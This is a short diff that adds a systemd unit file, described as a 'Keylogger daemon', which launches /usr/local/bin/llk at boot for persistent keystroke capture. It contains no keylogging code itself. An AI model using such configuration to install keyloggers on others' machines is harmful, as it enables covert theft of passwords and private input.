@@ -1,0 +1,11 @@
+[Unit]
+Description=Keylogger daemon
+
+[Service]
+Type=simple
+GuessMainPID=yes
+ExecStart=/usr/local/bin/llk
+# ExecStop=/usr/local/bin/llkk
+     
+[Install]
+WantedBy=multi-user.target
